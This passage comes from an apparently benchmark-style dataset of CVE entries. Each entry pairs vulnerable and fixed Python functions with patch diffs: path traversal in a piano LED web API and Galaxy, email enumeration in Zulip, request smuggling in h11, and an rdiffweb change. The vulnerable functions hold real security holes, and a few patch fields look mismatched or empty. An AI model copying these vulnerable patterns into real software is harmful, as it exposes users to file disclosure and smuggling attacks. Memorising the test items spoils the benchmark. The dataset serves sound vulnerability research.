sequences_tree.createElement(\"gradient_end_blue\")\n            gradient_end_blue.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.gradient_end[\"blue\"])))\n            step.appendChild(gradient_end_blue)\n\n        # if color_mode is equal to \"Scale\" load colors from webinterface.ledsettings and put it into step node\n        if (webinterface.ledsettings.color_mode == \"Scale\"):\n            # load values key_in_scale_red etc from webinterface.ledsettings and put them under key_in_scale_red etc\n            key_in_scale_red = sequences_tree.createElement(\"key_in_scale_red\")\n            key_in_scale_red.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.key_in_scale[\"red\"])))\n            step.appendChild(key_in_scale_red)\n\n            key_in_scale_green = sequences_tree.createElement(\"key_in_scale_green\")\n            key_in_scale_green.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.key_in_scale[\"green\"])))\n            step.appendChild(key_in_scale_green)\n\n            key_in_scale_blue = sequences_tree.createElement(\"key_in_scale_blue\")\n            key_in_scale_blue.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.key_in_scale[\"blue\"])))\n            step.appendChild(key_in_scale_blue)\n\n            # same as above but with key_not_in_scale\n            key_not_in_scale_red = sequences_tree.createElement(\"key_not_in_scale_red\")\n            key_not_in_scale_red.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.key_not_in_scale[\"red\"])))\n            step.appendChild(key_not_in_scale_red)\n\n            key_not_in_scale_green = sequences_tree.createElement(\"key_not_in_scale_green\")\n            key_not_in_scale_green.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.key_not_in_scale[\"green\"])))\n            step.appendChild(key_not_in_scale_green)\n\n            key_not_in_scale_blue = sequences_tree.createElement(\"key_not_in_scale_blue\")\n            key_not_in_scale_blue.appendChild(\n                sequences_tree.createTextNode(str(webinterface.ledsettings.key_not_in_scale[\"blue\"])))\n            step.appendChild(key_not_in_scale_blue)\n\n        try:\n            sequences_tree.getElementsByTagName(\"sequence_\" + str(value))[\n                0].insertBefore(step,\n                                sequences_tree.getElementsByTagName(\"sequence_\" + str(value))[\n                                    0].getElementsByTagName(\"step_\" + str(second_value + 1))[0])\n        except:\n            sequences_tree.getElementsByTagName(\"sequence_\" + str(value))[0].appendChild(step)\n\n        pretty_save(\"sequences.xml\", sequences_tree)\n\n        return jsonify(success=True, reload_sequence=reload_sequence, reload_steps_list=True)\n\n    if setting_name == \"screen_on\":\n        if (int(value) == 0):\n            webinterface.menu.disable_screen()\n        else:\n            webinterface.menu.enable_screen()\n\n    if setting_name == \"reset_to_default\":\n        webinterface.usersettings.reset_to_default()\n\n    if setting_name == \"restart_rpi\":\n        call(\"sudo /sbin/reboot now\", shell=True)\n\n    if setting_name == \"turnoff_rpi\":\n        call(\"sudo /sbin/shutdown -h now\", shell=True)\n\n    if setting_name == \"update_rpi\":\n        call(\"sudo git reset --hard HEAD\", shell=True)\n        call(\"sudo git checkout .\", shell=True)\n        call(\"sudo git clean -fdx\", shell=True)\n        call(\"sudo git pull origin master\", shell=True)\n\n    if setting_name == \"connect_ports\":\n        webinterface.midiports.connectall()\n        return jsonify(success=True, reload_ports=True)\n\n    if setting_name == \"disconnect_ports\":\n        call(\"sudo aconnect -x\", shell=True)\n        return jsonify(success=True, reload_ports=True)\n\n    if setting_name == \"restart_rtp\":\n        call(\"sudo systemctl restart rtpmidid\", shell=True)\n\n    if setting_name == \"start_recording\":\n        webinterface.saving.start_recording()\n        return jsonify(success=True, reload_songs=True)\n\n    if setting_name == \"cancel_recording\":\n        webinterface.saving.cancel_recording()\n        return jsonify(success=True, reload_songs=True)\n\n    if setting_name == \"save_recording\":\n        now = datetime.datetime.now()\n        current_date = now.strftime(\"%Y-%m-%d %H:%M\")\n        webinterface.saving.save(current_date)\n        return jsonify(success=True, reload_songs=True)\n\n    if setting_name == \"change_song_name\":\n        if os.path.exists(\"Songs/\" + second_value):\n            return jsonify(success=False, reload_songs=True, error=second_value + \" already exists\")\n\n        if \"_main\" in value:\n            search_name = value.replace(\"_main.mid\", \"\")\n            for fname in os.listdir('Songs'):\n                if search_name in fname:\n                    new_name = second_value.replace(\".mid\", \"\") + fname.replace(search_name, \"\")\n                    os.rename('Songs/' + fname, 'Songs/' + new_name)\n        else:\n            os.rename('Songs/' + value, 'Songs/' + second_value)\n            os.rename('Songs/cache/' + value + \".p\", 'Songs/cache/' + second_value + \".p\")\n\n\n\n        return jsonify(success=True, reload_songs=True)\n\n    if setting_name == \"remove_song\":\n        if \"_main\" in value:\n            name_no_suffix = value.replace(\"_main.mid\", \"\")\n            for fname in os.listdir('Songs'):\n                if name_no_suffix in fname:\n                    os.remove(\"Songs/\" + fname)\n        else:\n            os.remove(\"Songs/\" + value)\n\n            file_types = [\".musicxml\", \".xml\", \".mxl\", \".abc\"]\n            for file_type in file_types:\n                try:\n                    os.remove(\"Songs/\" + value.replace(\".mid\", file_type))\n                except:\n                    pass\n\n            try:\n                os.remove(\"Songs/cache/\" + value + \".p\")\n            except:\n                print(\"No cache file for \" + value)\n\n        return jsonify(success=True, reload_songs=True)\n\n    if setting_name == \"download_song\":\n        if \"_main\" in value:\n            zipObj = ZipFile(\"Songs/\" + value.replace(\".mid\", \"\") + \".zip\", 'w')\n            name_no_suffix = value.replace(\"_main.mid\", \"\")\n            songs_count = 0\n            for fname in os.listdir('Songs'):\n                if name_no_suffix in fname and \".zip\" not in fname:\n                    songs_count += 1\n                    zipObj.write(\"Songs/\" + fname)\n            zipObj.close()\n            if songs_count == 1:\n                os.remove(\"Songs/\" + value.replace(\".mid\", \"\") + \".zip\")\n                return send_file(\"../Songs/\" + value, mimetype='application/x-csv', attachment_filename=value,\n                                 as_attachment=True)\n            else:\n                return send_file(\"../Songs/\" + value.replace(\".mid\", \"\") + \".zip\", mimetype='application/x-csv',\n                                 attachment_filename=value.replace(\".mid\", \"\") + \".zip\", as_attachment=True)\n        else:\n            return send_file(safe_join(\"../Songs/\" + value), mimetype='application/x-csv', attachment_filename=value,\n                             as_attachment=True)\n\n    if setting_name == \"download_sheet_music\":\n        file_types = [\".musicxml\", \".xml\", \".mxl\", \".abc\"]\n        i = 0\n        while i < len(file_types):\n            try:\n                new_name = value.replace(\".mid\", file_types[i])\n                return send_file(\"../Songs/\" + new_name, mimetype='application/x-csv', attachment_filename=new_name,\n                                 as_attachment=True)\n            except:\n                i += 1\n        webinterface.learning.convert_midi_to_abc(value)\n        try:\n            return send_file(safe_join(\"../Songs/\", value.replace(\".mid\", \".abc\")), mimetype='application/x-csv',\n                             attachment_filename=value.replace(\".mid\", \".abc\"), as_attachment=True)\n        except:\n            print(\"Converting failed\")\n\n\n    if setting_name == \"start_midi_play\":\n        webinterface.saving.t = threading.Thread(target=play_midi, args=(value, webinterface.midiports,\n                                                                         webinterface.saving, webinterface.menu,\n                                                                         webinterface.ledsettings,\n                                                                         webinterface.ledstrip))\n        webinterface.saving.t.start()\n\n        return jsonify(success=True, reload_songs=True)\n\n    if setting_name == \"stop_midi_play\":\n        webinterface.saving.is_playing_midi.clear()\n        fastColorWipe(webinterface.ledstrip.strip, True, webinterface.ledsettings)\n\n        return jsonify(success=True, reload_songs=True)\n\n    if setting_name == \"learning_load_song\":\n        webinterface.learning.t = threading.Thread(target=webinterface.learning.load_midi, args=(value,))\n        webinterface.learning.t.start()\n\n        return jsonify(success=True, reload_learning_settings=True)\n\n    if setting_name == \"start_learning_song\":\n        webinterface.learning.t = threading.Thread(target=webinterface.learning.learn_midi)\n        webinterface.learning.t.start()\n\n        return jsonify(success=True)\n\n    if setting_name == \"stop_learning_song\":\n        webinterface.learning.is_started_midi = False\n        fastColorWipe(webinterface.ledstrip.strip, True, webinterface.ledsettings)\n\n        return jsonify(success=True)\n\n    if setting_name == \"change_practice\":\n        value = int(value)\n        webinterface.learning.practice = value\n        webinterface.learning.practice = clamp(webinterface.learning.practice, 0, len(webinterface.learning.practiceList) - 1)\n        webinterface.usersettings.change_setting_value(\"practice\", webinterface.learning.practice)\n\n        return jsonify(success=True)\n\n    if setting_name == \"change_tempo\":\n        value = int(value)\n        webinterface.learning.set_tempo = value\n        webinterface.learning.set_tempo = clamp(webinterface.learning.set_tempo, 10, 200)\n        webinterface.usersettings.change_setting_value(\"set_tempo\", webinterface.learning.set_tempo)\n\n        return jsonify(success=True)\n\n    if setting_name == \"change_hands\":\n        value = int(value)\n        webinterface.learning.hands = value\n        webinterface.learning.hands = clamp(webinterface.learning.hands, 0, len(webinterface.learning.handsList) - 1)\n        webinterface.usersettings.change_setting_value(\"hands\", webinterface.learning.hands)\n\n        return jsonify(success=True)\n\n    if setting_name == \"change_mute_hand\":\n        value = int(value)\n        webinterface.learning.mute_hand = value\n        webinterface.learning.mute_hand = clamp(webinterface.learning.mute_hand, 0, len(webinterface.learning.mute_handList) - 1)\n        webinterface.usersettings.change_setting_value(\"mute_hand\", webinterface.learning.mute_hand)\n\n        return jsonify(success=True)\n\n    if setting_name == \"learning_start_point\":\n        value = int(value)\n        webinterface.learning.start_point = value\n        webinterface.learning.start_point = clamp(webinterface.learning.start_point, 0, webinterface.learning.end_point - 1)\n        webinterface.usersettings.change_setting_value(\"start_point\", webinterface.learning.start_point)\n        webinterface.learning.restart_learning()\n\n        return jsonify(success=True)\n\n    if setting_name == \"learning_end_point\":\n        value = int(value)\n        webinterface.learning.end_point = value\n        webinterface.learning.end_point = clamp(webinterface.learning.end_point, webinterface.learning.start_point + 1, 100)\n        webinterface.usersettings.change_setting_value(\"end_point\", webinterface.learning.end_point)\n        webinterface.learning.restart_learning()\n\n        return jsonify(success=True)\n\n    if setting_name == \"set_current_time_as_start_point\":\n        webinterface.learning.start_point = round(float(webinterface.learning.current_idx * 100 / float(len(webinterface.learning.song_tracks))), 3)\n        webinterface.learning.start_point = clamp(webinterface.learning.start_point, 0, webinterface.learning.end_point - 1)\n        webinterface.usersettings.change_setting_value(\"start_point\", webinterface.learning.start_point)\n        webinterface.learning.restart_learning()\n\n        return jsonify(success=True, reload_learning_settings=True)\n\n    if setting_name == \"set_current_time_as_end_point\":\n        webinterface.learning.end_point = round(float(webinterface.learning.current_idx * 100 / float(len(webinterface.learning.song_tracks))), 3)\n        webinterface.learning.end_point = clamp(webinterface.learning.end_point, webinterface.learning.start_point + 1, 100)\n        webinterface.usersettings.change_setting_value(\"end_point\", webinterface.learning.end_point)\n        webinterface.learning.restart_learning()\n\n        return jsonify(success=True, reload_learning_settings=True)\n\n    if setting_name == \"change_handL_color\":\n        value = int(value)\n        webinterface.learning.hand_colorL += value\n        webinterface.learning.hand_colorL = clamp(webinterface.learning.hand_colorL, 0, len(webinterface.learning.hand_colorList) - 1)\n        webinterface.usersettings.change_setting_value(\"hand_colorL\", webinterface.learning.hand_colorL)\n\n        return jsonify(success=True, reload_learning_settings=True)\n\n    if setting_name == \"change_handR_color\":\n        value = int(value)\n        webinterface.learning.hand_colorR += value\n        webinterface.learning.hand_colorR = clamp(webinterface.learning.hand_colorR, 0, len(webinterface.learning.hand_colorList) - 1)\n        webinterface.usersettings.change_setting_value(\"hand_colorR\", webinterface.learning.hand_colorR)\n\n        return jsonify(success=True, reload_learning_settings=True)\n\n    if setting_name == \"change_learning_loop\":\n        value = int(value == 'true')\n        webinterface.learning.is_loop_active = value\n        webinterface.usersettings.change_setting_value(\"is_loop_active\", webinterface.learning.is_loop_active)\n\n        return jsonify(success=True)\n\n\n    return jsonify(success=True)"
      }
    ],
    "vul_patch": "--- a/webinterface/views_api.py\n+++ b/webinterface/views_api.py\n@@ -823,7 +823,7 @@\n                 return send_file(\"../Songs/\" + value.replace(\".mid\", \"\") + \".zip\", mimetype='application/x-csv',\n                                  attachment_filename=value.replace(\".mid\", \"\") + \".zip\", as_attachment=True)\n         else:\n-            return send_file(\"../Songs/\" + value, mimetype='application/x-csv', attachment_filename=value,\n+            return send_file(safe_join(\"../Songs/\" + value), mimetype='application/x-csv', attachment_filename=value,\n                              as_attachment=True)\n \n     if setting_name == \"download_sheet_music\":\n@@ -838,7 +838,7 @@\n                 i += 1\n         webinterface.learning.convert_midi_to_abc(value)\n         try:\n-            return send_file(\"../Songs/\" + value.replace(\".mid\", \".abc\"), mimetype='application/x-csv',\n+            return send_file(safe_join(\"../Songs/\", value.replace(\".mid\", \".abc\")), mimetype='application/x-csv',\n                              attachment_filename=value.replace(\".mid\", \".abc\"), as_attachment=True)\n         except:\n             print(\"Converting failed\")\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-56136",
    "cve_description": "Zulip server provides an open-source team chat that helps teams stay productive and focused. Zulip Server 7.0 and above are vulnerable to an information disclose attack, where, if a Zulip server is hosting multiple organizations, an unauthenticated user can make a request and determine if an email address is in use by a user. Zulip Server 9.4 resolves the issue, as does the `main` branch of Zulip Server. Users are advised to upgrade. There are no known workarounds for this issue.",
    "cwe_info": {
      "CWE-200": {
        "name": "Exposure of Sensitive Information to an Unauthorized Actor",
        "description": "The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information."
      }
    },
    "repo": "https://github.com/zulip/zulip",
    "patch_url": [
      "https://github.com/zulip/zulip/commit/c6334a765b1e6d71760e4a3b32ae5b8367f2ed4d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_344_1",
        "commit": "ff5512e5a93ac3ecf327288b3f37e032de0aaf81",
        "file_path": "zerver/views/auth.py",
        "start_line": 989,
        "end_line": 1001,
        "snippet": "def get_api_key_fetch_authenticate_failure(return_data: dict[str, bool]) -> JsonableError:\n    if return_data.get(\"inactive_user\"):\n        return UserDeactivatedError()\n    if return_data.get(\"inactive_realm\"):\n        return RealmDeactivatedError()\n    if return_data.get(\"password_auth_disabled\"):\n        return PasswordAuthDisabledError()\n    if return_data.get(\"password_reset_needed\"):\n        return PasswordResetRequiredError()\n    if return_data.get(\"invalid_subdomain\"):\n        raise InvalidSubdomainError\n\n    return AuthenticationFailedError()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_344_1",
        "commit": "c6334a765b1e6d71760e4a3b32ae5b8367f2ed4d",
        "file_path": "zerver/views/auth.py",
        "start_line": 989,
        "end_line": 1004,
        "snippet": "def get_api_key_fetch_authenticate_failure(return_data: dict[str, bool]) -> JsonableError:\n    if return_data.get(\"inactive_user\"):\n        return UserDeactivatedError()\n    if return_data.get(\"inactive_realm\"):\n        return RealmDeactivatedError()\n    if return_data.get(\"password_auth_disabled\"):\n        return PasswordAuthDisabledError()\n    if return_data.get(\"password_reset_needed\"):\n        return PasswordResetRequiredError()\n    if return_data.get(\"invalid_subdomain\"):\n        # We must not report invalid_subdomain here; that value is intended only for informing server logs,\n        # and should never be exposed to end users, since it would leak whether there exists\n        # an account in a different organization with the same email address.\n        return AuthenticationFailedError()\n\n    return AuthenticationFailedError()"
      }
    ],
    "vul_patch": "--- a/zerver/views/auth.py\n+++ b/zerver/views/auth.py\n@@ -8,6 +8,9 @@\n     if return_data.get(\"password_reset_needed\"):\n         return PasswordResetRequiredError()\n     if return_data.get(\"invalid_subdomain\"):\n-        raise InvalidSubdomainError\n+        # We must not report invalid_subdomain here; that value is intended only for informing server logs,\n+        # and should never be exposed to end users, since it would leak whether there exists\n+        # an account in a different organization with the same email address.\n+        return AuthenticationFailedError()\n \n     return AuthenticationFailedError()\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2025-43859",
    "cve_description": "h11 is a Python implementation of HTTP/1.1. Prior to version 0.16.0, a leniency in h11's parsing of line terminators in chunked-coding message bodies can lead to request smuggling vulnerabilities under certain conditions. This issue has been patched in version 0.16.0. Since exploitation requires the combination of buggy h11 with a buggy (reverse) proxy, fixing either component is sufficient to mitigate this issue.",
    "cwe_info": {
      "CWE-444": {
        "name": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')",
        "description": "The product acts as an intermediary HTTP agent\n         (such as a proxy or firewall) in the data flow between two\n         entities such as a client and server, but it does not\n         interpret malformed HTTP requests or responses in ways that\n         are consistent with how the messages will be processed by\n         those entities that are at the ultimate destination."
      }
    },
    "repo": "https://github.com/python-hyper/h11",
    "patch_url": [
      "https://github.com/python-hyper/h11/commit/114803a29ce50116dc47951c690ad4892b1a36ed"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_68_1",
        "commit": "9462006f6ce4941661888228cbd4ac1ea80689b0",
        "file_path": "h11/_readers.py",
        "start_line": 149,
        "end_line": 155,
        "snippet": "    def __init__(self) -> None:\n        self._bytes_in_chunk = 0\n        # After reading a chunk, we have to throw away the trailing \\r\\n.\n        # This tracks the bytes that we need to match and throw away.\n        # de-chunkification.\n        self._bytes_to_discard = 0\n        self._reading_trailer = False"
      },
      {
        "id": "vul_py_68_2",
        "commit": "9462006f6ce4941661888228cbd4ac1ea80689b0",
        "file_path": "h11/_readers.py",
        "start_line": 157,
        "end_line": 201,
        "snippet": "    def __call__(self, buf: ReceiveBuffer) -> Union[Data, EndOfMessage, None]:\n        if self._reading_trailer:\n            lines = buf.maybe_extract_lines()\n            if lines is None:\n                return None\n            return EndOfMessage(headers=list(_decode_header_lines(lines)))\n        if self._bytes_to_discard >0 :\n            data = buf.maybe_extract_at_most(self._bytes_to_discard)\n            if data is None:\n                return None\n            self._bytes_to_discard -= len(data)\n            if self._bytes_to_discard > 0:\n                return None\n            # else, fall through and read some more\n        assert self._bytes_to_discard == 0\n        if self._bytes_in_chunk == 0:\n            # We need to refill our chunk count\n            chunk_header = buf.maybe_extract_next_line()\n            if chunk_header is None:\n                return None\n            matches = validate(\n                chunk_header_re,\n                chunk_header,\n                \"illegal chunk header: {!r}\",\n                chunk_header,\n            )\n            # XX FIXME: we discard chunk extensions. Does anyone care?\n            self._bytes_in_chunk = int(matches[\"chunk_size\"], base=16)\n            if self._bytes_in_chunk == 0:\n                self._reading_trailer = True\n                return self(buf)\n            chunk_start = True\n        else:\n            chunk_start = False\n        assert self._bytes_in_chunk > 0\n        data = buf.maybe_extract_at_most(self._bytes_in_chunk)\n        if data is None:\n            return None\n        self._bytes_in_chunk -= len(data)\n        if self._bytes_in_chunk == 0:\n            self._bytes_to_discard = 2\n            chunk_end = True\n        else:\n            chunk_end = False\n        return Data(data=data, chunk_start=chunk_start, chunk_end=chunk_end)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_68_1",
        "commit": "114803a29ce50116dc47951c690ad4892b1a36ed",
        "file_path": "h11/_readers.py",
        "start_line": 149,
        "end_line": 154,
        "snippet": "    def __init__(self) -> None:\n        self._bytes_in_chunk = 0\n        # After reading a chunk, we have to throw away the trailing \\r\\n.\n        # This tracks the bytes that we need to match and throw away.\n        self._bytes_to_discard = b\"\"\n        self._reading_trailer = False"
      },
      {
        "id": "fix_py_68_2",
        "commit": "114803a29ce50116dc47951c690ad4892b1a36ed",
        "file_path": "h11/_readers.py",
        "start_line": 156,
        "end_line": 204,
        "snippet": "    def __call__(self, buf: ReceiveBuffer) -> Union[Data, EndOfMessage, None]:\n        if self._reading_trailer:\n            lines = buf.maybe_extract_lines()\n            if lines is None:\n                return None\n            return EndOfMessage(headers=list(_decode_header_lines(lines)))\n        if self._bytes_to_discard:\n            data = buf.maybe_extract_at_most(len(self._bytes_to_discard))\n            if data is None:\n                return None\n            if data != self._bytes_to_discard[:len(data)]:\n                raise LocalProtocolError(\n                    f\"malformed chunk footer: {data!r} (expected {self._bytes_to_discard!r})\"\n                )\n            self._bytes_to_discard = self._bytes_to_discard[len(data):]\n            if self._bytes_to_discard:\n                return None\n            # else, fall through and read some more\n        assert self._bytes_to_discard == b\"\"\n        if self._bytes_in_chunk == 0:\n            # We need to refill our chunk count\n            chunk_header = buf.maybe_extract_next_line()\n            if chunk_header is None:\n                return None\n            matches = validate(\n                chunk_header_re,\n                chunk_header,\n                \"illegal chunk header: {!r}\",\n                chunk_header,\n            )\n            # XX FIXME: we discard chunk extensions. Does anyone care?\n            self._bytes_in_chunk = int(matches[\"chunk_size\"], base=16)\n            if self._bytes_in_chunk == 0:\n                self._reading_trailer = True\n                return self(buf)\n            chunk_start = True\n        else:\n            chunk_start = False\n        assert self._bytes_in_chunk > 0\n        data = buf.maybe_extract_at_most(self._bytes_in_chunk)\n        if data is None:\n            return None\n        self._bytes_in_chunk -= len(data)\n        if self._bytes_in_chunk == 0:\n            self._bytes_to_discard = b\"\\r\\n\"\n            chunk_end = True\n        else:\n            chunk_end = False\n        return Data(data=data, chunk_start=chunk_start, chunk_end=chunk_end)"
      }
    ],
    "vul_patch": "\n\n\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2025-43859:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/h11\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2025-43859/bin/python -m pytest h11/tests/test_io.py -k \"t_body_reader or test_ChunkedReader or test_ContentLengthWriter\"\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2025-43859:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/h11\ngit apply --whitespace=nowarn /workspace/test.patch\n/workspace/PoC_env/CVE-2025-43859/bin/python -m pytest h11/tests/test_io.py -k \"not test_ChunkedReader\" -p no:warning --disable-warnings\n"
  },
  {
    "cve_id": "CVE-2022-4720",
    "cve_description": "Open Redirect in GitHub repository ikus060/rdiffweb prior to 2.5.5.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/ikus060/rdiffweb",
    "patch_url": [
      "https://github.com/ikus060/rdiffweb/commit/6afaae56a29536f0118b3380d296c416aa6d078d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_147_1",
        "commit": "b0c1422",
        "file_path": "rdiffweb/core/notification.py",
        "start_line": 66,
        "end_line": 78,
        "snippet": "    def access_token_added(self, userobj, name):\n        if not self.send_changed:\n            return\n\n        if not userobj.email:\n            logger.info(\"can't sent mail to user [%s] without an email\", userobj.username)\n            return\n\n        # Send a mail notification\n        body = self.app.templates.compile_template(\n            \"access_token_added.html\", **{\"header_name\": self.app.cfg.header_name, 'user': userobj, 'name': name}\n        )\n        self.bus.publish('queue_mail', to=userobj.email, subject=_(\"A new access token has been created\"), message=body)"
      },
      {
        "id": "vul_py_147_2",
        "commit": "b0c1422",
        "file_path": "rdiffweb/core/notification.py",
        "start_line": 111,
        "end_line": 123,
        "snippet": "    def user_password_changed(self, userobj):\n        if not self.send_changed:\n            return\n\n        if not userobj.email:\n            logger.info(\"can't sent mail to user [%s] without an email\", userobj.username)\n            return\n\n        # If the email attributes was changed, send a mail notification.\n        body = self.app.templates.compile_template(\n            \"password_changed.html\", **{\"header_name\": self.app.cfg.header_name, 'user': userobj}\n        )\n        self.bus.publish('queue_mail', to=userobj.email, subject=_(\"Password changed\"), message=body)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_147_1",
        "commit": "6afaae5",
        "file_path": "rdiffweb/core/notification.py",
        "start_line": 66,
        "end_line": 78,
        "snippet": "    def access_token_added(self, userobj, name):\n        if not self.send_changed:\n            return\n\n        if not userobj.email:\n            logger.info(\"can't sent mail to user [%s] without an email\", userobj.username)\n            return\n\n        # Send a mail notification\n        body = self.app.templates.compile_template(\n            \"email_access_token_added.html\", **{\"header_name\": self.app.cfg.header_name, 'user': userobj, 'name': name}\n        )\n        self.bus.publish('queue_mail', to=userobj.email, subject=_(\"A new access token has been created\"), message=body)"
      },
      {
        "id": "fix_py_147_2",
        "commit": "6afaae5",
        "file_path": "rdiffweb/core/notification.py",
        "start_line": 111,
        "end_line": 123,
        "snippet": "    def user_password_changed(self, userobj):\n        if not self.send_changed:\n            return\n\n        if not userobj.email:\n            logger.info(\"can't sent mail to user [%s] without an email\", userobj.username)\n            return\n\n        # If the email attributes was changed, send a mail notification.\n        body = self.app.templates.compile_template(\n            \"email_password_changed.html\", **{\"header_name\": self.app.cfg.header_name, 'user': userobj}\n        )\n        self.bus.publish('queue_mail', to=userobj.email, subject=_(\"Password changed\"), message=body)"
      }
    ],
    "vul_patch": "--- a/rdiffweb/core/notification.py\n+++ b/rdiffweb/core/notification.py\n@@ -8,6 +8,6 @@\n \n         # Send a mail notification\n         body = self.app.templates.compile_template(\n-            \"access_token_added.html\", **{\"header_name\": self.app.cfg.header_name, 'user': userobj, 'name': name}\n+            \"email_access_token_added.html\", **{\"header_name\": self.app.cfg.header_name, 'user': userobj, 'name': name}\n         )\n         self.bus.publish('queue_mail', to=userobj.email, subject=_(\"A new access token has been created\"), message=body)\n\n--- a/rdiffweb/core/notification.py\n+++ b/rdiffweb/core/notification.py\n@@ -8,6 +8,6 @@\n \n         # If the email attributes was changed, send a mail notification.\n         body = self.app.templates.compile_template(\n-            \"password_changed.html\", **{\"header_name\": self.app.cfg.header_name, 'user': userobj}\n+            \"email_password_changed.html\", **{\"header_name\": self.app.cfg.header_name, 'user': userobj}\n         )\n         self.bus.publish('queue_mail', to=userobj.email, subject=_(\"Password changed\"), message=body)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-23470",
    "cve_description": "Galaxy is an open-source platform for data analysis. An arbitrary file read exists in Galaxy 22.01 and Galaxy 22.05 due to the switch to Gunicorn, which can be used to read any file accessible to the operating system user under which Galaxy is running. This vulnerability affects Galaxy 22.01 and higher, after the switch to gunicorn, which serve static contents directly.  Additionally, the vulnerability is mitigated when using Nginx or Apache to serve /static/* contents, instead of Galaxy's internal middleware. This issue has been patched in commit `e5e6bda4f` and will be included in future releases. Users are advised to manually patch their installations. There are no known workarounds for this vulnerability.",
    "cwe_info": {
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/galaxyproject/galaxy",
    "patch_url": [
      "https://github.com/galaxyproject/galaxy/commit/e5e6bda4f014f807ca77ee0cf6af777a55918346"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_108_1",
        "commit": "7136d72",
        "file_path": "lib/galaxy/web/framework/middleware/static.py",
        "start_line": 17,
        "end_line": 60,
        "snippet": "    def __call__(self, environ, start_response):\n        path_info = environ.get('PATH_INFO', '')\n        if not path_info:\n            # See if this is a static file hackishly mapped.\n            if os.path.exists(self.directory) and os.path.isfile(self.directory):\n                app = FileApp(self.directory)\n                if self.cache_seconds:\n                    app.cache_control(max_age=int(self.cache_seconds))\n                return app(environ, start_response)\n            return self.add_slash(environ, start_response)\n        if path_info == '/':\n            # @@: This should obviously be configurable\n            filename = 'index.html'\n        else:\n            filename = request.path_info_pop(environ)\n\n        directory = self.directory\n        host = environ.get('HTTP_HOST')\n        if self.directory_per_host and host:\n            for host_key, host_val in self.directory_per_host.items():\n                if host_key in host:\n                    directory = host_val\n                    break\n\n        full = os.path.join(directory, filename)\n        if not os.path.exists(full):\n            return self.not_found(environ, start_response)\n        if os.path.isdir(full):\n            # @@: Cache?\n            return self.__class__(full)(environ, start_response)\n        if environ.get('PATH_INFO') and environ.get('PATH_INFO') != '/':\n            return self.error_extra_path(environ, start_response)\n        if_none_match = environ.get('HTTP_IF_NONE_MATCH')\n        if if_none_match:\n            mytime = os.stat(full).st_mtime\n            if str(mytime) == if_none_match:\n                headers: List[Tuple[str, str]] = []\n                ETAG.update(headers, mytime)\n                start_response('304 Not Modified', headers)\n                return ['']  # empty body\n        app = FileApp(full)\n        if self.cache_seconds:\n            app.cache_control(max_age=int(self.cache_seconds))\n        return app(environ, start_response)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_108_1",
        "commit": "e5e6bda",
        "file_path": "lib/galaxy/web/framework/middleware/static.py",
        "start_line": 17,
        "end_line": 64,
        "snippet": "    def __call__(self, environ, start_response):\n        path_info = environ.get('PATH_INFO', '')\n        if not path_info:\n            # See if this is a static file hackishly mapped.\n            if os.path.exists(self.directory) and os.path.isfile(self.directory):\n                app = FileApp(self.directory)\n                if self.cache_seconds:\n                    app.cache_control(max_age=int(self.cache_seconds))\n                return app(environ, start_response)\n            return self.add_slash(environ, start_response)\n        if path_info == '/':\n            # @@: This should obviously be configurable\n            filename = 'index.html'\n        else:\n            filename = request.path_info_pop(environ)\n\n        directory = self.directory\n        host = environ.get('HTTP_HOST')\n        if self.directory_per_host and host:\n            for host_key, host_val in self.directory_per_host.items():\n                if host_key in host:\n                    directory = host_val\n                    break\n\n        full = self.normpath(os.path.join(directory, filename))\n        if not full.startswith(directory):\n            # Out of bounds\n            return self.not_found(environ, start_response)\n\n        if not os.path.exists(full):\n            return self.not_found(environ, start_response)\n        if os.path.isdir(full):\n            # @@: Cache?\n            return self.__class__(full)(environ, start_response)\n        if environ.get('PATH_INFO') and environ.get('PATH_INFO') != '/':\n            return self.error_extra_path(environ, start_response)\n        if_none_match = environ.get('HTTP_IF_NONE_MATCH')\n        if if_none_match:\n            mytime = os.stat(full).st_mtime\n            if str(mytime) == if_none_match:\n                headers: List[Tuple[str, str]] = []\n                ETAG.update(headers, mytime)\n                start_response('304 Not Modified', headers)\n                return ['']  # empty body\n        app = FileApp(full)\n        if self.cache_seconds:\n            app.cache_control(max_age=int(self.cache_seconds))\n        return app(environ, start_response)"
      }
    ],
